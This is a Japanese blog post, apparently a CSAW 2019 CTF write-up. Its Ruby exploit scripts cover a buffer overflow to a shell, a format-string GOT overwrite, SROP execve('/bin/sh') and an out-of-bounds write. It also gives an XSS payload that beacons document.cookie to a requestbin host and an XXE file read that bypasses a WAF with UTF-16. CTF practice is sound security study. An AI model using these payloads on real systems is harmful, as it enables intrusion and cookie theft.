@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+
+
+<base href="https://alicemacs.com/">
+
+<title>
+  $ make life - Csaw2019 writeup 
+</title>
+
+<meta name="generator" content="Hugo 0.54.0" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400|Roboto+Slab:400,700|Roboto:300,300i,400,400i,500,500i,700,700i">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+<link rel="stylesheet" href="https://alicemacs.com/css/main.css">
+<link rel="stylesheet" href="https://alicemacs.com/css/custom.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="theme-color" content="#ffffff">
+
+</head>
+<body lang="ja">
+<div class="container">
+
+
+<header class="row text-left title">
+  <h1 class="title">Csaw2019 writeup</h1>
+</header>
+<section id="category-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-left meta">
+        PUBLISHED ON SEP 16, 2019 
+      
+      
+      
+      —
+      
+      
+      <a class="meta" href="/categories/writeup">WRITEUP</a>
+      
+      
+      
+    </h6>
+  </div>
+  
+</section>
+<section id="content-pane" class="row">
+  <div class="col-md-12 text-justify content">
+    
+    <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#misc">Misc</a>
+<ul>
+<li><a href="#mcgriddlev2">mcgriddlev2</a></li>
+</ul></li>
+<li><a href="#pwn">Pwn</a>
+<ul>
+<li><a href="#baby-boi-50pt">baby_boi (50pt)</a></li>
+<li><a href="#got-milk-50pt">GOT Milk? (50pt)</a></li>
+<li><a href="#small-boi-100pt">small_boi (100pt)</a></li>
+<li><a href="#traveller">traveller</a></li>
+</ul></li>
+<li><a href="#rev">Rev</a>
+<ul>
+<li><a href="#beleaf">Beleaf</a></li>
+</ul></li>
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#baby-csp">baby csp</a></li>
+<li><a href="#unagi">unagi</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+    
+    
+
+<h2 id="misc">Misc</h2>
+
+<h3 id="mcgriddlev2">mcgriddlev2</h3>
+
+<ul>
+<li>問題文にFLAGが記載されている</li>
+<li><strong>flag{W3lcome_7o_CSAW_QUALS_2019!}</strong></li>
+</ul>
+
+<h2 id="pwn">Pwn</h2>
+
+<h3 id="baby-boi-50pt">baby_boi (50pt)</h3>
+
+<ul>
+<li>シンプルなBOFでIPが奪える問題</li>
+
+<li><p>libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う</p>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+# coding: ascii-8bit
+require 'pwn'
+$z = Sock.new &quot;localhost&quot;, 8888
+$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1005
+libc = ELF.new &quot;./libc-2.27.so&quot;
+#libc = ELF.new &quot;/lib/x86_64-linux-gnu/libc-2.29.so&quot;
+def z; $z; end
+z.recvuntil(&quot;\n&quot;)
+libc_printf = z.recvuntil(&quot;\n&quot;).match(/: (.+)/)[1].to_i(16)
+libc_base = libc_printf - libc.symbols[&quot;printf&quot;]
+puts &quot;%x&quot; % libc_base
+payload = &quot;A&quot; * 40
+payload &lt;&lt; p64(libc_base + 0x4f322)
+z.sendline(payload)
+z.interact
+</code></pre></li>
+
+<li><p><strong>flag{baby_boi_dodooo_doo_doo_dooo}</strong></p></li>
+</ul>
+
+<h3 id="got-milk-50pt">GOT Milk? (50pt)</h3>
+
+<ul>
+<li>独自の共有オブジェクトとバイナリが配られる</li>
+<li><code>set LD_LIBRARY_PATH ./</code> でカレントディレクトリの共有オブジェクトを見るようにする</li>
+
+<li><p>FSBがあるので、それを使ってGOT Overwriteする</p>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+# coding: ascii-8bit
+require 'pwn'
+require 'fsa'
+#$z = Sock.new &quot;localhost&quot;, 8888
+$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1004
+def z; $z; end
+value = 0x89
+fmt = FSA.new()
+fmt[0x804a010] = value
+payload = fmt.payload(7) # index of argument
+puts z.recvuntil(&quot;? &quot;)
+z.sendline(payload)
+puts z.recv
+</code></pre></li>
+
+<li><p><strong>flag{y0u_g00000t_mi1k_4_M3!?}</strong></p></li>
+</ul>
+
+<h3 id="small-boi-100pt">small_boi (100pt)</h3>
+
+<ul>
+<li>statically linked でstrippedな小さなバイナリが与えられる</li>
+
+<li><p>sig_return システムコールを呼ぶようなraxの設定のされ方があるのと自明なBOFがあるので、Sigreturn ROP (SROP) で <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> を実行する</p>
+
+<ul>
+<li>SROPは、スタックの値を使ってsig_return実行時にレジスタの値を代入する攻撃</li>
+
+<li><p>これを使ってrdiやrsi、ripなどが設定できるため任意のシステムコールを呼べる</p>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+# coding: ascii-8bit
+require 'pwn'
+#$z = Sock.new &quot;localhost&quot;, 8888
+$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1002
+def z; $z; end
+payload = &quot;\x00&quot; * 0x28
+payload &lt;&lt; p64(0x40017c)
+payload &lt;&lt; p64(0x0) * 4
+payload &lt;&lt; p64(0x0) * 8 # r8~r15
+payload &lt;&lt; p64(0x4001ca) # rdi = /bin/sh
+payload &lt;&lt; p64(0) # rsi
+payload &lt;&lt; p64(0) # rbp
+payload &lt;&lt; p64(0) # 
+payload &lt;&lt; p64(0) # 
+payload &lt;&lt; p64(0x3b) # rax = 0x3b 
+payload &lt;&lt; p64(0) # rcx
+payload &lt;&lt; p64(0)   # rsp
+payload &lt;&lt; p64(0x00400185) # rip = syscall
+payload &lt;&lt; p64(0x0) # eflags
+payload &lt;&lt; p16(0x33) # cs
+payload &lt;&lt; p16(0)
+payload &lt;&lt; p16(0)
+payload &lt;&lt; p16(0x2b) # ss
+payload &lt;&lt; p64(0x0) * 5 # err ~ union
+payload &lt;&lt; p64(0x0) * 8 # reserved[8]
+z.sendline payload
+z.interact
+</code></pre></li>
+</ul></li>
+
+<li><p><strong>flag{sigrop_pop_pop_pop}</strong></p></li>
+</ul>
+
+<h3 id="traveller">traveller</h3>
+
+<ul>
+<li>解けなかったのでwriteupを見た</li>
+<li>Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題</li>
+
+<li><p>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす</p>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+# coding: ascii-8bit
+require 'pwn'
+$z = Sock.new &quot;pwn.chal.csaw.io&quot;, 1003
+#elf = ELF.new &quot;./traveller&quot;
+#libc = ELF.new &quot;./libc-2.23.so&quot;
+context.log_level = :debug
+def z; $z; end
+def add(dist, dest)
+z.sendline &quot;1&quot;
+z.recvuntil &quot;&gt; &quot;
+z.sendline dist.to_s
+z.recvuntil &quot;: &quot;
+z.sendline dest
+z.recvuntil &quot;&gt; &quot;
+end
+def change(dist, dest)
+z.sendline &quot;2&quot;
+z.recvuntil &quot;: &quot;
+z.sendline dist.to_s
+z.send dest
+z.recvuntil &quot;&gt; &quot;
+end
+def delete(dist)
+z.sendline &quot;3&quot;
+z.recvuntil &quot;: &quot;
+z.sendline dist.to_s
+z.recvuntil &quot;&gt; &quot;
+end
+def check(dist)
+z.sendline &quot;4&quot;
+z.recvuntil &quot;&gt;&quot;
+z.sendline dist.to_s
+return z.recvuntil &quot;&gt; &quot;
+end
+tmp = z.recvuntil &quot;&gt; &quot;
+stack_address = tmp.match(/.\n(.*) \n\n/)[1].to_i(16)
+add(1, &quot;AAAAAAAA&quot;)
+change(-50, p64(0x4008b6))
+puts delete(0)
+</code></pre></li>
+
+<li><p><strong>flag{h0pe_y0u_3nj0y_ur_j0urn3y}</strong></p></li>
+</ul>
+
+<h2 id="rev">Rev</h2>
+
+<h3 id="beleaf">Beleaf</h3>
+
+<ul>
+<li>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+
+idxs = [0x1, 0x9, 0x11, 0x27, 0x02, 0x00, 0x12, 0x03, 0x8, 0x12, 0x9, 0x12, 0x11, 0x1, 0x3, 0x13, 0x4, 0x3, 0x5, 0x15, 0x2e, 0xa, 0x3, 0xa, 0x12, 0x3, 0x1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 0x6]
+
+flag = [0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0x20, 0x62, 0x6c, 0x72, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x65, 0x69, 0x20, 0x6f, 0x74, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75].map(&amp;:chr)
+
+idxs.each do |i|
+  print flag[i]
+end
+</code></pre>
+
+<ul>
+<li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
+</ul>
+
+<h2 id="web">Web</h2>
+
+<h3 id="baby-csp">baby csp</h3>
+
+<ul>
+<li>CSPが有効なXSS問題
+
+<ul>
+<li><code>default-src 'self'; script-src 'self' *.google.com; connect-src *</code></li>
+</ul></li>
+<li>上記のCSPからJSONPエンドポイントでのXSSを使う
+
+<ul>
+<li><a href="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137</a></li>
+</ul></li>
+<li>FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む</li>
+<li><code>&lt;script src=&quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon('http://requestbin.net/r/ugix54ug', document.cookie)&quot;&gt;&lt;/script&gt;</code></li>
+<li><strong>flag{csp_will_solve_EVERYTHING}</strong></li>
+</ul>
+
+<h3 id="unagi">unagi</h3>
+
+<ul>
+<li>解けなかったのでwriteupを見た</li>
+<li>XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない
+
+<ul>
+<li>PUBLIC は使えたりした</li>
+</ul></li>
+<li>結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった
+
+<ul>
+<li>試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい</li>
+</ul></li>
+<li><code>cat x.xml | iconv -f UTF-8 -t UTF-16BE &gt; x_utf-16.xml</code> などで作成してアップロードする
+<code>xml
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY pass SYSTEM &quot;file:///flag.txt&quot;&gt;
+]&gt;
+&lt;users&gt;
+&lt;user&gt;
+&lt;username&gt;alice2&lt;/username&gt;
+&lt;password&gt;passwd1&lt;/password&gt;
+&lt;name&gt;Alice2&lt;/name&gt;
+&lt;email&gt;alice2@fakesite.com&lt;/email&gt;
+&lt;group&gt;CSAW2019&lt;/group&gt;
+&lt;intro&gt;&amp;pass;&lt;/intro&gt;
+&lt;/user&gt;
+&lt;/users&gt;
+</code></li>
+<li><strong>flag{n0w_i&rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}</strong></li>
+</ul>
+
+  </div>
+</section>
+<section id="tag-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-right meta">
+      
+    </h6>
+  </div>
+  
+</section>
+
+
+
+
+
+
+
+
+<section id="menu-pane" class="row menu text-center">
+  
+  
+  <span><a class="menu-item" href="https://alicemacs.com/blog/harekazectf2019/">&lt; prev | </a></span>
+  
+  
+  <span><a class="menu-item" href="/blog">blog</a></span>
+  
+  
+  <span><a class="menu-item" href="https://alicemacs.com/blog/greenhornd_writeup/"> | next &gt;</a></span>
+  
+  
+  <h4 class="text-center"><a class="menu-item" href="https://alicemacs.com/">home</a></h4>
+</section>
+
+
+
+<footer class="row text-center footer">
+  <hr />
+  
+  <h6 class="text-center copyright">© 2019. Chihiro Hasegawa. <a href="https://creativecommons.org/licenses/by/3.0/">Some Rights Reserved</a>.</h6>
+  
+  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.54.0</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
+  
+      
+      <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
+    
+  
+</footer>
+
+</div>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+
+<script type="text/javascript">
+hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+
+
